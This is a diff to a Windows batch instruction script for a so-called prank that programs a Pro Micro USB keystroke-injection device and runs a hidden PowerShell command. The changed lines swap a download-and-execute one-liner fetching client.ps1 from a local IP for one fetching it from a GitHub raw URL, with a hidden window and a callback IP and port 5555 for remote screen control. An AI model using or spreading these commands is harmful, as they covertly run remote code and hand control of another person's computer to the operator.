@@ -15,8 +15,8 @@ echo        RECOMMENDED: 2_START_SERVER_GITHUB.bat (uses GitHub)
 echo        Alternative: 2_START_SERVERS.bat (local web server)
 echo.
 echo Step 3: Program Pro Micro
-echo        Arduino IDE -^> Open ProMicro_Payload.ino
-echo        Update IP (line 18): 172.28.1.78
+echo        Arduino IDE -^> Open ProMicro_GitHub.ino
+echo        Update IP (line 19): 192.168.8.158
 echo        Upload to Pro Micro
 echo.
 echo Step 4: Execute Prank
@@ -31,15 +31,15 @@ echo ================================================
 echo.
 echo Press Win+R and paste this:
 echo.
-echo powershell -W Hidden -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
+echo powershell -W Hidden -NoP -C "$c='192.168.8.158';$p=5555;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
 echo.
 echo ================================================
 echo.
 echo Current Files:
-echo   1_SETUP_FIREWALL.bat  ^<-- Run as Admin (once)
-echo   2_START_SERVERS.bat   ^<-- Start servers
-echo   ProMicro_Payload.ino  ^<-- Upload to Pro Micro
-echo   TEST_COMMAND.ps1      ^<-- Test commands
+echo   1_SETUP_FIREWALL.bat     ^<-- Run as Admin (once)
+echo   2_START_SERVER_GITHUB.bat ^<-- Start GUI (GitHub mode)
+echo   ProMicro_GitHub.ino      ^<-- Upload to Pro Micro
+echo   PowerShellCommand.ps1    ^<-- Test commands
 echo.
 echo ================================================
 echo.
